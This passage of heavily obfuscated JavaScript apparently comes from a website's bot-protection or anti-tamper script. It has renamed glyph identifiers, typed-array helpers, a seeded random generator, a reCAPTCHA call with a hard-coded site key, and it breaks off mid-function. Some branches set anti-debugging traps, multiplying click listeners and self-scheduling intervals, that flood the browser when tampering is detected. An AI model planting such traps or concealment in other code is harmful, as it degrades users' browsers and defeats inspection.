		function ⲆⵠⲆΔⵠⵠᐃ(ⵠΔⵠᐃᐃ) {
			return 31 - Math.clz32(ⵠΔⵠᐃᐃ >>> ΔⲆⵠⲆΔΔⲆ & 31)
		}

		function ⲆⵠⵠΔⲆⵠⵠΔΔ(ⲆᐃⲆᐃΔ) {
			const ᐃΔΔΔᐃΔⵠ = new Uint8Array(ⲆᐃⲆᐃΔ);
			const ᐃΔⵠⵠⵠ = ΔᐃᐃⵠΔⲆΔ(ᐃΔΔΔᐃΔⵠ.length, ᐃⵠⵠⲆⵠᐃⲆ);
			ΔᐃᐃᐃᐃⲆΔ.set(ᐃΔΔΔᐃΔⵠ, ᐃΔⵠⵠⵠ);
			return ᐃΔⵠⵠⵠ
		}

		function ⵠᐃᐃⵠⵠⲆⲆᐃⵠ(ⲆᐃΔⵠⵠᐃⵠ) {
			const ⵠⵠⲆᐃⵠ = ⲆᐃΔⵠⵠᐃⵠ.length;
			const ᐃΔⵠⵠⵠ = ᐃΔⵠⲆᐃⲆⵠ(ⵠⵠⲆᐃⵠ << ⵠΔᐃ, ΔⲆⲆⵠᐃⵠⵠ);
			const ⵠⵠᐃᐃⲆⲆⲆ = new Uint16Array(ⲆΔΔΔΔ);
			for (var ⵠᐃ = 0, ᐃⲆⲆ = ᐃΔⵠⵠⵠ >>> 1; ⵠᐃ < ⵠⵠⲆᐃⵠ; ++ⵠᐃ) ⵠⵠᐃᐃⲆⲆⲆ[ᐃⲆⲆ + ⵠᐃ] = ⲆᐃΔⵠⵠᐃⵠ.charCodeAt(ⵠᐃ);
			return ᐃΔⵠⵠⵠ
		}
		const ⲆᐃΔᐃΔᐃᐃ = ⲆᐃⵠᐃⲆⵠⲆ;

		function ⲆΔⲆΔⲆⲆΔᐃᐃ(ᐃΔⵠⵠⵠ) {
			let ⵠⲆⲆⵠⵠⲆΔ = "";
			ᐃΔⵠⵠⵠ /= 2;
			const ΔⲆΔᐃⲆ = ᐃΔΔᐃⲆ[ᐃΔⵠⵠⵠ / ⵠⵠⵠΔ - ᐃᐃⵠ] / 2;
			for (let ⵠᐃ = 0; ⵠᐃ < ΔⲆΔᐃⲆ; ⵠᐃ++) ⵠⲆⲆⵠⵠⲆΔ += String.fromCharCode(ⵠᐃᐃΔⵠᐃⲆ[ᐃΔⵠⵠⵠ++]);
			return ⵠⲆⲆⵠⵠⲆΔ
		}

		function ᐃⲆⵠᐃᐃᐃᐃⵠⵠ(ΔΔᐃⲆⵠ, ⵠΔⵠᐃᐃΔᐃ) {
			ⵠΔⵠᐃᐃΔᐃ = ⵠΔⵠᐃᐃΔᐃ || ᐃⵠⲆ;
			const ⵠΔⵠΔⵠⵠᐃ = ⵠΔⵠᐃᐃΔᐃ;
			const ⵠΔⵠᐃᐃ = ΔᐃⲆᐃΔΔⵠ(ΔΔᐃⲆⵠ);
			const ᐃⲆΔΔᐃᐃⵠ = ⲆⵠⲆΔⵠⵠᐃ(ⵠΔⵠᐃᐃ);
			const ᐃᐃⵠᐃⵠΔΔ = typeof ⵠΔⵠΔⵠⵠᐃ !== "number";
			const ⵠⵠⲆᐃⵠ = ᐃᐃⵠᐃⵠΔΔ ? ⵠΔⵠΔⵠⵠᐃ.length : ⵠΔⵠΔⵠⵠᐃ;
			const ⲆᐃⲆᐃΔ = ΔᐃᐃⵠΔⲆΔ(ⵠⵠⲆᐃⵠ << ᐃⲆΔΔᐃᐃⵠ, ⵠΔⵠᐃᐃ & ΔⲆᐃᐃⵠᐃᐃ ? ΔΔᐃⲆⵠ : ᐃⵠⵠⲆⵠᐃⲆ);
			let ⵠΔⵠⵠΔⲆⵠ;
			if (ⵠΔⵠᐃᐃ & ΔⲆᐃᐃⵠᐃᐃ) {
				ⵠΔⵠⵠΔⲆⵠ = ⲆᐃⲆᐃΔ
			} else {
				ⵠᐃⵠⵠⵠⵠⲆ(ⲆᐃⲆᐃΔ);
				const ΔᐃⲆᐃⲆ = ΔᐃᐃⵠΔⲆΔ(ⵠΔⵠᐃᐃ & ΔᐃΔᐃⲆΔᐃ ? ᐃⲆᐃⵠⲆⲆᐃ : ⵠⲆⵠⵠⵠᐃⵠ, ΔΔᐃⲆⵠ);
				ᐃⲆⵠΔⲆᐃΔ(ⲆᐃⲆᐃΔ);
				ᐃΔΔᐃⲆ[ΔᐃⲆᐃⲆ + ᐃⵠΔΔⲆⵠⲆ >>> ᐃⲆⵠᐃ] = ⲆᐃⲆᐃΔ;
				ᐃΔΔᐃⲆ[ΔᐃⲆᐃⲆ + ᐃΔᐃⵠᐃΔΔ >>> ᐃⲆⵠᐃ] = ⲆᐃⲆᐃΔ;
				ᐃΔΔᐃⲆ[ΔᐃⲆᐃⲆ + ⲆΔΔⲆΔⵠⲆ >>> ⵠⵠⵠΔ] = ⵠⵠⲆᐃⵠ << ᐃⲆΔΔᐃᐃⵠ;
				if (ⵠΔⵠᐃᐃ & ΔᐃΔᐃⲆΔᐃ) ᐃΔΔᐃⲆ[ΔᐃⲆᐃⲆ + ⲆΔⵠᐃⲆΔⲆ >>> 2] = ⵠⵠⲆᐃⵠ;
				ⵠΔⵠⵠΔⲆⵠ = ΔᐃⲆᐃⲆ
			}
			if (ᐃᐃⵠᐃⵠΔΔ) {
				const ⵠⲆⵠΔᐃⵠⲆ = ΔⲆᐃⵠⲆⵠᐃ(ᐃⲆΔΔᐃᐃⵠ, ⵠΔⵠᐃᐃ & ⵠⲆΔᐃⵠⲆⵠ, ⵠΔⵠᐃᐃ & ⵠⲆⵠⵠᐃΔΔ);
				const ΔⵠΔΔΔⲆᐃ = ⲆᐃⲆᐃΔ >>> ᐃⲆΔΔᐃᐃⵠ;
				if (ⵠΔⵠᐃᐃ & ᐃᐃΔΔⵠΔⲆ) {
					for (let ⵠᐃ = ᐃⵠⲆ; ⵠᐃ < ⵠⵠⲆᐃⵠ; ++ⵠᐃ) {
						ⵠⲆⵠΔᐃⵠⲆ[ΔⵠΔΔΔⲆᐃ + ⵠᐃ] = ⵠΔⵠΔⵠⵠᐃ[ⵠᐃ]
					}
				} else {
					ⵠⲆⵠΔᐃⵠⲆ.set(ⵠΔⵠΔⵠⵠᐃ, ΔⵠΔΔΔⲆᐃ)
				}
			}
			return ⵠΔⵠⵠΔⲆⵠ
		}

		function ΔⲆᐃⵠⲆⵠᐃ(ᐃⲆΔⵠⵠⲆⲆ, ᐃⲆΔΔⵠΔⵠ, ᐃⲆᐃΔᐃⲆΔ) {
			if (ᐃⲆᐃΔᐃⲆΔ) {
				switch (ᐃⲆΔⵠⵠⲆⲆ) {
					case ᐃⲆⵠᐃ:
						return ΔⲆⲆⲆⲆⲆⲆ;
					case 3:
						return ᐃⵠⵠⲆⵠⲆΔ
				}
			} else {
				switch (ᐃⲆΔⵠⵠⲆⲆ) {
					case 0:
						return ᐃⲆΔΔⵠΔⵠ ? ⵠⲆⲆΔΔⲆⵠ : ΔᐃᐃᐃᐃⲆΔ;
					case 1:
						return ᐃⲆΔΔⵠΔⵠ ? ᐃᐃᐃⲆΔⵠⲆ : ⵠᐃᐃΔⵠᐃⲆ;
					case 2:
						return ᐃⲆΔΔⵠΔⵠ ? ᐃΔⵠᐃⵠⵠΔ : ᐃΔΔᐃⲆ;
					case ΔⲆᐃⲆ:
						return ᐃⲆΔΔⵠΔⵠ ? ⲆᐃᐃᐃⵠⲆΔ : ΔⲆΔΔⲆⵠΔ
				}
			}
		}

		function ⲆⲆᐃⲆⲆⵠⵠΔⵠ(ΔᐃⲆᐃⲆ) {
			const ⵠΔⵠΔⵠⵠᐃ = ⲆᐃⲆⵠⵠⵠⲆ(ΔᐃⲆᐃⲆ);
			const ΔⲆΔᐃⲆ = ⵠΔⵠΔⵠⵠᐃ.length;
			const ᐃᐃΔⵠⲆᐃΔ = new Array(ΔⲆΔᐃⲆ);
			for (let ⵠᐃ = 0; ΔⲆΔᐃⲆ > ⵠᐃ; ⵠᐃ++) ᐃᐃΔⵠⲆᐃΔ[ⵠᐃ] = ⵠΔⵠΔⵠⵠᐃ[ⵠᐃ];
			return ᐃᐃΔⵠⲆᐃΔ
		}

		function ⲆᐃⲆⵠⵠⵠⲆ(ΔᐃⲆᐃⲆ) {
			const ΔΔᐃⲆⵠ = ᐃΔΔᐃⲆ[ΔᐃⲆᐃⲆ + ΔⵠⵠⵠΔⲆⲆ >>> 2];
			const ⵠΔⵠᐃᐃ = ΔᐃⲆᐃΔΔⵠ(ΔΔᐃⲆⵠ);
			const ᐃⲆΔΔᐃᐃⵠ = ⲆⵠⲆΔⵠⵠᐃ(ⵠΔⵠᐃᐃ);
			let ⲆᐃⲆᐃΔ = ⵠΔⵠᐃᐃ & ΔⲆᐃᐃⵠᐃᐃ ? ΔᐃⲆᐃⲆ : ᐃΔΔᐃⲆ[ΔᐃⲆᐃⲆ + ᐃΔᐃⵠᐃΔΔ >>> 2];
			const ⵠⵠⲆᐃⵠ = ⵠΔⵠᐃᐃ & ΔᐃΔᐃⲆΔᐃ ? ᐃΔΔᐃⲆ[ΔᐃⲆᐃⲆ + ⲆΔⵠᐃⲆΔⲆ >>> 2] : ᐃΔΔᐃⲆ[ⲆᐃⲆᐃΔ + ᐃΔⲆⲆⲆⵠⵠ >>> 2] >>> ᐃⲆΔΔᐃᐃⵠ;
			return ΔⲆᐃⵠⲆⵠᐃ(ᐃⲆΔΔᐃᐃⵠ, ⵠΔⵠᐃᐃ & ⵠⲆΔᐃⵠⲆⵠ, ⵠΔⵠᐃᐃ & ⵠⲆⵠⵠᐃΔΔ).subarray(ⲆᐃⲆᐃΔ >>>= ᐃⲆΔΔᐃᐃⵠ, ⲆᐃⲆᐃΔ + ⵠⵠⲆᐃⵠ)
		}
		const ΔΔΔΔΔ = Ⲇᐃⵠⵠⵠ;
		const ⵠⵠⵠᐃᐃ = ΔⵠⵠⲆⵠ;
		const ᐃᐃⲆᐃᐃ = ⵠⲆⲆⵠᐃ;
		const ΔΔᐃᐃⲆ = ⵠᐃⵠⵠⲆ;
		const ⵠⲆᐃᐃⲆ = ⲆΔⲆⲆᐃ;
		const ⲆᐃᐃⲆ = ᐃⲆⵠᐃ;
		const ΔⵠⲆⵠᐃᐃΔ = ΔⵠᐃΔⵠ;

		function ΔᐃᐃᐃΔΔΔΔᐃ(ᐃΔⵠⵠⵠ) {
			const ⵠⵠⲆᐃⵠ = ᐃΔΔᐃⲆ[ᐃΔⵠⵠⵠ + ᐃΔⲆⲆⲆⵠⵠ >>> 2];
			return ⲆΔΔΔΔ.slice(ᐃΔⵠⵠⵠ, ᐃΔⵠⵠⵠ + ⵠⵠⲆᐃⵠ)
		}
		const ⲆᐃΔᐃ = ΔⲆᐃⲆ;
		const ⲆΔᐃⲆᐃᐃᐃ = {};
		const ⲆⵠΔⵠΔⲆⲆ = {};
		ⲆΔᐃⲆᐃᐃᐃ["get"] = function(ᐃⲆⲆΔ, ᐃᐃΔᐃⲆᐃⵠ) {
			if (ᐃᐃΔᐃⲆᐃⵠ !== "ⲆΔᐃⲆᐃᐃᐃ") {
				const ⲆΔᐃⲆᐃᐃᐃ = function() {
					for (let ᐃⲆⲆΔ = 0; ᐃⲆⲆΔ < 5; ᐃⲆⲆΔ++) ᐃⲆᐃΔᐃⵠᐃ[ΔᐃⲆⵠⲆⵠΔ[277]]("click", (function() {
						ⲆΔᐃⲆᐃᐃᐃ()
					}))
				};
				ⲆΔᐃⲆᐃᐃᐃ()
			}
			return ᐃⲆᐃΔᐃⵠᐃ["Reflect"]["get"](...arguments)
		};
		const ⲆᐃᐃⲆⵠⲆΔ = new ᐃⲆᐃΔᐃⵠᐃ["Proxy"](ⲆⵠΔⵠΔⲆⲆ, ⲆΔᐃⲆᐃᐃᐃ);
		const ΔᐃⲆΔⵠᐃᐃⵠⵠ = ⲆᐃᐃⲆⵠⲆΔ.ⲆΔᐃⲆᐃᐃᐃ;
		const ᐃⲆⲆⲆ = ⵠΔⵠᐃⵠ;
		const ΔⲆⵠΔⵠΔᐃ = () => new Promise(((ᐃⲆⵠⲆᐃⵠⵠ, ᐃᐃΔⲆⲆⲆᐃ) => {
			ᐃⲆᐃΔᐃⵠᐃ["grecaptcha"]["ready"]((function() {
				ᐃⲆᐃΔᐃⵠᐃ["grecaptcha"]["execute"]("6LdvBaEjAAAAAIKTgdecsZBehRxhVZOIDzG9MvXg", {
					action: "validate_recaptcha"
				}).then((function(ᐃΔΔⲆⲆ) {
					ᐃⲆⵠⲆᐃⵠⵠ(ᐃΔΔⲆⲆ)
				})).catch((ⵠⵠⵠΔΔΔⵠ => {
					if (ΔΔⵠΔᐃ) {
						ᐃⲆⵠⲆᐃⵠⵠ(0);
						return
					}
					console.log(ΔΔΔⲆΔ);
					ᐃᐃΔⲆⲆⲆᐃ(ⵠⵠⵠΔΔΔⵠ)
				}))
			}))
		}));
		const ΔⵠΔᐃⵠᐃⵠ = ⵠⵠⵠⲆᐃΔⲆ;
		const ΔⲆⲆⲆⵠ = ⵠⲆᐃΔᐃ;
		const ᐃᐃⲆⲆΔΔΔ = {
			"ⵠⵠⵠⲆⲆⲆᐃ": "development",
			"ΔᐃⲆΔⲆΔⵠ": "production"
		};
		const ⵠᐃᐃΔᐃ = ⲆⵠᐃΔᐃ;
		const ⵠᐃᐃᐃᐃᐃᐃ = ᐃᐃⲆⲆΔΔΔ.ΔᐃⲆΔⲆΔⵠ;
		const ΔⲆⲆ = ᐃⵠⲆ;
		const ⲆⲆⲆΔⲆΔᐃ = Δⵠᐃⵠⵠ;

		function ᐃⵠΔΔⲆ(ΔⵠⲆᐃⵠ) {
			this.ⵠΔᐃΔⵠ = 2147483648;
			this.a = 1103515245;
			this.c = 12345;
			this.state = ΔⵠⲆᐃⵠ ? ΔⵠⲆᐃⵠ : Math.floor(Math.random() * (this.ⵠΔᐃΔⵠ - 1))
		}
		const ᐃΔΔⵠᐃ = ⲆⵠΔⵠⵠ;
		ᐃⵠΔΔⲆ.prototype.random = function() {
			this.state = (this.a * this.state + this.c) % this.ⵠΔᐃΔⵠ;
			return this.state / this.ⵠΔᐃΔⵠ
		};
		const ᐃΔΔΔ = ⵠᐃΔⵠ;
		const ⲆΔⵠᐃ = ⵠΔᐃΔ;
		ᐃⵠΔΔⲆ.prototype.ᐃⲆⲆⲆⲆⲆΔ = function(ΔⵠⲆᐃⵠ) {
			this.state = ΔⵠⲆᐃⵠ
		};
		const ᐃⵠⵠᐃᐃ = ΔⲆΔᐃᐃ;
		const ⵠⲆⲆⲆᐃ = ⵠⲆᐃᐃⲆ;
		ᐃⵠⵠⲆⲆⲆΔ = 1e4;
		ⲆᐃⵠⲆⵠⵠⲆ = [];
		const ΔᐃᐃⲆⲆ = ᐃᐃⵠΔⵠ;
		const Ⲇⵠⵠⵠ = ⵠᐃΔΔ;
		const ⲆⲆⲆΔⲆ = ᐃⵠΔᐃΔ;
		var ⵠᐃⵠⲆᐃⲆⵠ = new ᐃⵠΔΔⲆ;
		ⵠᐃⵠⲆᐃⲆⵠ.ᐃⲆⲆⲆⲆⲆΔ((new Date).getTime());
		for (var ⵠᐃⲆⲆ = 0; ⵠᐃⲆⲆ < ᐃⵠⵠⲆⲆⲆΔ; ⵠᐃⲆⲆ++) ⲆᐃⵠⲆⵠⵠⲆ.push(ⵠᐃⵠⲆᐃⲆⵠ.random());

		function ᐃⵠΔⲆᐃᐃⵠ(ⲆΔᐃⲆⲆⲆΔ, ᐃΔΔⲆΔⲆⵠ, ⲆΔΔΔᐃⲆⲆ, ⲆΔⲆΔΔΔᐃ, ᐃΔᐃⲆᐃⲆΔ) {
			const ᐃⵠΔΔⵠⵠᐃ = ((ⲆΔᐃⲆⲆⲆΔ + 14772) * 2147483629 + 2147483587) % 2147483647;
			const ⲆⵠⵠΔΔΔᐃ = 63080 ^ ᐃΔΔⲆΔⲆⵠ;
			const ⲆΔⲆⲆⲆΔᐃ = ((ⲆΔΔΔᐃⲆⲆ + 60304) * 22695477 + 1) % 4294967296;
			const ⵠⲆΔⵠⵠᐃⲆ = ~(5467 & ⲆΔⲆΔΔΔᐃ) & 5467 | ~(5467 & ⲆΔⲆΔΔΔᐃ) & ⲆΔⲆΔΔΔᐃ;
			const ΔΔᐃΔΔᐃᐃ = (ᐃΔᐃⲆᐃⲆΔ | 40165) & ~(40165 & ᐃΔᐃⲆᐃⲆΔ);
			const ⲆⵠⲆⵠᐃΔⵠ = ⵠΔⲆⵠⲆⲆⲆ(ᐃⵠΔΔⵠⵠᐃ, ⲆⵠⵠΔΔΔᐃ, ⲆΔⲆⲆⲆΔᐃ, ⵠⲆΔⵠⵠᐃⲆ);
			const ΔΔⲆΔᐃΔᐃ = ⵠⲆᐃⲆⲆΔΔ(ΔΔᐃΔΔᐃᐃ, ᐃⵠΔΔⵠⵠᐃ, ⲆⵠⵠΔΔΔᐃ, ⲆΔⲆⲆⲆΔᐃ, ⵠⲆΔⵠⵠᐃⲆ);
			const ⵠΔΔΔⲆΔΔ = ᐃᐃᐃⲆᐃΔᐃ(ΔΔᐃΔΔᐃᐃ, ᐃⵠΔΔⵠⵠᐃ, ⲆⵠⵠΔΔΔᐃ, ⲆΔⲆⲆⲆΔᐃ, ⵠⲆΔⵠⵠᐃⲆ, ΔΔᐃΔΔᐃᐃ);
			const ⲆⵠᐃⲆⵠΔⵠ = (16 << ((ⲆⵠⲆⵠᐃΔⵠ ^ ΔΔⲆΔᐃΔᐃ) >> 24 & 255)) + (8 << ((ⲆⵠⲆⵠᐃΔⵠ ^ ΔΔⲆΔᐃΔᐃ) >> 16 & 255)) + (24 << ((ⲆⵠⲆⵠᐃΔⵠ ^ ΔΔⲆΔᐃΔᐃ) >> 32 & 255)) + (32 << ((ⲆⵠⲆⵠᐃΔⵠ ^ ΔΔⲆΔᐃΔᐃ) >> 8 & 255));
			const ΔⵠΔⲆⲆⲆⵠ = (1664525 * (28765 + (ⲆⵠᐃⲆⵠΔⵠ ^ ⵠΔΔΔⲆΔΔ)) + 1013904223) % 4294967296;
			return ΔⵠΔⲆⲆⲆⵠ
		}

		function ⲆⵠΔΔΔΔᐃ(ᐃⵠΔⲆⲆ, ΔⵠⵠΔⵠ, ⲆⵠⲆⲆⲆΔⲆ, ᐃᐃᐃΔⵠⵠΔ) {
			const ΔᐃⵠᐃΔⵠᐃ = ~(59259 & ᐃⵠΔⲆⲆ) & ᐃⵠΔⲆⲆ | ~(ᐃⵠΔⲆⲆ & 59259) & 59259;
			const ⲆⲆᐃᐃΔⲆⲆ = ~(ΔⵠⵠΔⵠ & 56097) & ΔⵠⵠΔⵠ | ~(ΔⵠⵠΔⵠ & 56097) & 56097;
			const ⲆⲆⲆⲆⲆⵠⲆ = (1664525 * (43315 + ⲆⵠⲆⲆⲆΔⲆ) + 1013904223) % 4294967296;
			const ⵠᐃⵠΔⲆΔᐃ = (8 << (ᐃᐃᐃΔⵠⵠΔ >> 24 & ᐃᐃᐃⵠⵠ)) + (32 << (ᐃᐃᐃΔⵠⵠΔ >> 32 & 255)) + (24 << (ᐃᐃᐃΔⵠⵠΔ >> 8 & 255)) + (16 << (ᐃᐃᐃΔⵠⵠΔ >> 16 & 255));
			const ⲆΔΔⵠΔⲆⲆ = ΔⲆΔᐃᐃⵠΔ(ΔᐃⵠᐃΔⵠᐃ, ⲆⲆᐃᐃΔⲆⲆ, ⲆⲆⲆⲆⲆⵠⲆ, ⵠᐃⵠΔⲆΔᐃ, ΔᐃⵠᐃΔⵠᐃ, ⲆⲆᐃᐃΔⲆⲆ);
			const ᐃⲆⲆⲆᐃΔΔ = ⵠⲆᐃⲆⲆΔΔ(ⲆⲆⲆⲆⲆⵠⲆ, ⵠᐃⵠΔⲆΔᐃ, ΔᐃⵠᐃΔⵠᐃ, ⲆⲆᐃᐃΔⲆⲆ, ⲆⲆⲆⲆⲆⵠⲆ);
			const ⲆᐃᐃΔⲆⵠⲆΔᐃ = ΔᐃᐃᐃΔⵠᐃ(ⵠᐃⵠΔⲆΔᐃ, ΔᐃⵠᐃΔⵠᐃ, ⲆⲆᐃᐃΔⲆⲆ, ⲆⲆⲆⲆⲆⵠⲆ, ⵠᐃⵠΔⲆΔᐃ, ΔᐃⵠᐃΔⵠᐃ);
			const ⲆⲆⲆⲆⲆⲆⵠ = (1013904223 + 1664525 * ((ⲆΔΔⵠΔⲆⲆ ^ ᐃⲆⲆⲆᐃΔΔ) + 26191)) % 4294967296;
			const ⲆⲆΔᐃΔⲆⵠ = (ⲆⲆⲆⲆⲆⲆⵠ | 38630) & ~(38630 & ⲆⲆⲆⲆⲆⲆⵠ);
			return ⲆⲆΔᐃΔⲆⵠ
		}

		function ᐃⲆᐃᐃᐃΔⵠ(ⲆⵠΔⲆⲆᐃᐃ, ⲆⲆΔᐃΔⵠⵠ, ΔⲆΔⵠᐃⲆⵠ, ΔⲆΔⲆⵠᐃⲆ, ᐃΔⲆᐃⵠⲆᐃ, ⲆᐃⲆΔΔΔΔ) {
			const ΔⵠⵠΔᐃⲆᐃ = (214013 * (39488 + ⲆⵠΔⲆⲆᐃᐃ) + 2531011) % 4294967296;
			const ᐃⵠⵠⵠⵠⲆᐃ = ~(49976 & ⲆⲆΔᐃΔⵠⵠ) & ⲆⲆΔᐃΔⵠⵠ | ~(ⲆⲆΔᐃΔⵠⵠ & 49976) & 49976;
			const ΔΔᐃΔⵠᐃⵠ = ~(ΔⲆΔⵠᐃⲆⵠ & 35856) & ΔⲆΔⵠᐃⲆⵠ | ~(ΔⲆΔⵠᐃⲆⵠ & 35856) & 35856;
			const ⲆⲆᐃΔΔⵠᐃ = 52219 ^ ΔⲆΔⲆⵠᐃⲆ;
			const ΔⵠΔΔᐃᐃⲆ = (ᐃΔⲆᐃⵠⲆᐃ + 3575) % 65503;
			const ᐃᐃΔⵠΔΔᐃ = ~(6932 & ⲆᐃⲆΔΔΔΔ) & ⲆᐃⲆΔΔΔΔ | ~(ⲆᐃⲆΔΔΔΔ & 6932) & 6932;
			const ⲆΔⵠΔΔⲆΔ = ⲆΔΔⵠΔⵠΔ(ΔⵠⵠΔᐃⲆᐃ, ᐃⵠⵠⵠⵠⲆᐃ, ΔΔᐃΔⵠᐃⵠ, ⲆⲆᐃΔΔⵠᐃ, ΔⵠΔΔᐃᐃⲆ);
			const ⲆΔᐃⵠΔᐃⲆ = ᐃⵠᐃⲆΔᐃᐃ(ᐃᐃΔⵠΔΔᐃ, ΔⵠⵠΔᐃⲆᐃ, ᐃⵠⵠⵠⵠⲆᐃ, ΔΔᐃΔⵠᐃⵠ, ⲆⲆᐃΔΔⵠᐃ, ΔⵠΔΔᐃᐃⲆ);
			const ⵠⲆⲆᐃⵠΔᐃΔΔ = ΔⵠΔΔᐃΔⲆ(ᐃᐃΔⵠΔΔᐃ, ΔⵠⵠΔᐃⲆᐃ, ᐃⵠⵠⵠⵠⲆᐃ, ΔΔᐃΔⵠᐃⵠ, ⲆⲆᐃΔΔⵠᐃ, ΔⵠΔΔᐃᐃⲆ);
			const ᐃⲆⲆⲆⵠⲆⵠ = (1013904223 + ((ⲆΔⵠΔΔⲆΔ ^ ⲆΔᐃⵠΔᐃⲆ) + 60709) * 1664525) % 4294967296;
			const ⲆΔⲆⲆᐃᐃⲆ = ~(ᐃⲆⲆⲆⵠⲆⵠ & 42138) & ᐃⲆⲆⲆⵠⲆⵠ | ~(ᐃⲆⲆⲆⵠⲆⵠ & 42138) & 42138;
			return ⲆΔⲆⲆᐃᐃⲆ
		}
		const ⵠⵠⲆΔΔⲆᐃ = 14188719;
		const ⲆⲆΔⵠⲆⵠⲆ = ⵠⵠⲆΔΔⲆᐃ["ΔΔⵠᐃⵠᐃΔ"];
		const ⵠᐃΔⵠⵠΔᐃ = `const ⵠⵠⲆⵠᐃΔΔ = (typeof ΔΔⵠᐃⲆⵠᐃ === "${ⲆⲆΔⵠⲆⵠⲆ}") ? 1 : 0; return ⵠⵠⲆⵠᐃΔΔ;`;

		function ΔΔⵠᐃⲆⵠᐃ() {
			ⲆⲆΔⵠⲆⵠⲆ;
			ⵠⵠⲆΔΔⲆᐃ();
			return ⵠᐃΔⵠⵠΔᐃ
		}
		const ⵠⵠⲆⵠᐃΔΔ = 8010494;
		const ΔⵠᐃⵠⲆΔⲆ = new Function(ΔΔⵠᐃⲆⵠᐃ + ⵠᐃΔⵠⵠΔᐃ);
		const ⵠΔⲆΔⵠᐃΔᐃΔ = 7688669;
		if (ΔⵠᐃⵠⲆΔⲆ(ⵠⵠⲆⵠᐃΔΔ, ⵠΔⲆΔⵠᐃΔᐃΔ) === 1) {
			const ⵠⵠⲆΔΔⲆᐃ = ᐃⲆᐃΔᐃⵠᐃ.setInterval;
			const ⲆⲆΔⵠⲆⵠⲆ = ⵠⵠⲆΔΔⲆᐃ;
			const ΔΔⵠᐃⵠᐃΔ = function() {
				ⵠⵠⲆΔΔⲆᐃ(ΔΔⵠᐃⵠᐃΔ, 6858);
				ⲆⲆΔⵠⲆⵠⲆ(ΔΔⵠᐃⵠᐃΔ, 2278)
			};
			ΔΔⵠᐃⵠᐃΔ()
		}
		const ΔΔⲆΔᐃᐃᐃ = ⵠᐃᐃΔᐃ;
		const ⲆΔⵠⵠ = ⲆᐃΔᐃ;
		const ⲆⲆⲆⵠⵠᐃᐃ = String.fromCharCode;
		const ⵠⵠΔⵠΔⵠⲆⲆΔ = 101;
		const ⵠⵠⲆⲆ = 118;
		const ⵠᐃΔΔⵠⵠᐃ = "ⲆᐃᐃᐃΔⲆⲆ";
		const ΔⵠΔⲆᐃⲆΔ = 97;
		const ᐃΔⲆᐃΔⲆⵠᐃⲆ = 108;
		const ⵠᐃⵠⲆⲆΔⵠ = ⲆⲆⲆⵠⵠᐃᐃ(ⵠⵠΔⵠΔⵠⲆⲆΔ);
		const ⲆⵠᐃΔΔⲆⵠΔⲆ = ⲆⲆⲆⵠⵠᐃᐃ(ⵠⵠⲆⲆ);

		function ⲆᐃᐃᐃΔⲆⲆ() {
			ⵠⵠΔᐃⵠ = ⲆᐃᐃᐃΔⲆⲆ;
			return ⲆᐃᐃᐃΔⲆⲆ
		}
		const ⲆⲆⲆⲆΔΔⵠ = ⲆⲆⲆⵠⵠᐃᐃ(ΔⵠΔⲆᐃⲆΔ);
		const ΔⲆᐃⵠⵠΔΔⲆⲆ = ⲆⲆⲆⵠⵠᐃᐃ(ᐃΔⲆᐃΔⲆⵠᐃⲆ);
		const ⵠⲆΔΔⲆⲆΔ = ⵠᐃⵠⲆⲆΔⵠ + ⲆⵠᐃΔΔⲆⵠΔⲆ + ⲆⲆⲆⲆΔΔⵠ + ΔⲆᐃⵠⵠΔΔⲆⲆ;
		const ᐃΔⵠⲆᐃⲆᐃ = ᐃⲆᐃΔᐃⵠᐃ[ⵠⲆΔΔⲆⲆΔ];
		const ᐃⵠⵠⲆΔΔⵠⲆᐃ = ᐃΔⵠⲆᐃⲆᐃ(ⲆᐃᐃᐃΔⲆⲆ + "try{" + ⵠᐃΔΔⵠⵠᐃ + "();0;}catch(ⲆⲆⲆⲆΔΔⵠ){1;}");
		if (ᐃⵠⵠⲆΔΔⵠⲆᐃ) {
			const ⲆⲆⲆⵠⵠᐃᐃ = function() {
				for (let ⵠⵠΔⵠΔⵠⲆⲆΔ = 0; ⵠⵠΔⵠΔⵠⲆⲆΔ < 5; ⵠⵠΔⵠΔⵠⲆⲆΔ++) ᐃⲆᐃΔᐃⵠᐃ[ΔᐃⲆⵠⲆⵠΔ[277]]("click", (function() {
					ⲆⲆⲆⵠⵠᐃᐃ()
				}))
			};
			ⲆⲆⲆⵠⵠᐃᐃ()
		}
		const ΔⵠⲆⲆ = ⲆΔΔᐃ;
		const ΔΔᐃⲆⲆⵠⵠ = ⵠⲆⵠⵠⵠⵠᐃ;

		function ᐃΔΔⲆⵠᐃΔ(ⲆΔⵠⵠⵠⵠⲆ, ᐃⵠⵠⵠⵠΔᐃ, ᐃᐃΔⲆⲆⲆⵠ, ᐃΔᐃᐃⲆΔⲆ, ⲆⵠᐃᐃᐃⵠΔ) {
			const ΔΔⲆᐃΔΔΔ = (32 << (ⲆΔⵠⵠⵠⵠⲆ >> 24 & 255)) + (16 << (ⲆΔⵠⵠⵠⵠⲆ >> 8 & 255)) + (24 << (ⲆΔⵠⵠⵠⵠⲆ >> ΔⵠΔᐃᐃ & 255)) + (8 << (ⲆΔⵠⵠⵠⵠⲆ >> 32 & 255));
			const ⲆᐃⲆⲆⵠⲆⲆ = (ᐃⵠⵠⵠⵠΔᐃ + 39144) % 65406;
			const ΔⵠⵠⲆΔΔⲆ = ᐃᐃΔⲆⲆⲆⵠ ^ 34575;
			const ⲆⵠΔᐃᐃΔⵠ = ~(37841 & ᐃΔᐃᐃⲆΔⲆ) & ᐃΔᐃᐃⲆΔⲆ | ~(ᐃΔᐃᐃⲆΔⲆ & 37841) & 37841;
			const ΔᐃᐃⵠⵠΔᐃ = (25975 | ⲆⵠᐃᐃᐃⵠΔ) & ~(25975 & ⲆⵠᐃᐃᐃⵠΔ);
			const ⲆⵠⲆⵠᐃⲆⲆ = ΔⲆΔᐃΔ(ΔΔⲆᐃΔΔΔ, ⲆᐃⲆⲆⵠⲆⲆ, ΔⵠⵠⲆΔΔⲆ, ⲆⵠΔᐃᐃΔⵠ);
			const ⵠΔΔⵠⵠⲆΔⵠᐃ = ᐃⲆⵠⲆⵠΔⵠ(ΔᐃᐃⵠⵠΔᐃ, ΔΔⲆᐃΔΔΔ, ⲆᐃⲆⲆⵠⲆⲆ, ΔⵠⵠⲆΔΔⲆ, ⲆⵠΔᐃᐃΔⵠ);
